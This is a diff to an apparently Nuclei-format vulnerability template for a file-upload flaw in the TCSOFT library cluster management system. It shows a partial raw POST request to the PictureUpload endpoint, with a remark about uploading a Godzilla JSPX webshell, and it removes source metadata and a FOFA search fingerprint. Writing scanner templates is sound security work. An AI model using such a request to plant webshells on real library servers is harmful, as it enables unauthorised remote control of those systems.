@@ -3,12 +3,8 @@ info:
   name: 广州图创图书馆集群管理系统 PictureUpload 存在文件上传致漏洞_xb1vm6csxnt1zngl
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: file-upload,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: app="TCSOFT-图书馆集群管理系统"
 http:
 - raw:
   - 'POST /interlib/loan/PictureUpload HTTP/1.1
@@ -37,11 +33,7 @@ http:
 
     ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
-    上传哥斯拉jspx马
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749827080177-125885dc-4425-4f1e-9676-12c6c3008546.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749827080435-c2e209f7-5a95-4ac3-a83e-d2b375a5de1c.png)'
+    上传哥斯拉jspx马'
   redirects: false
   matchers:
   - status:
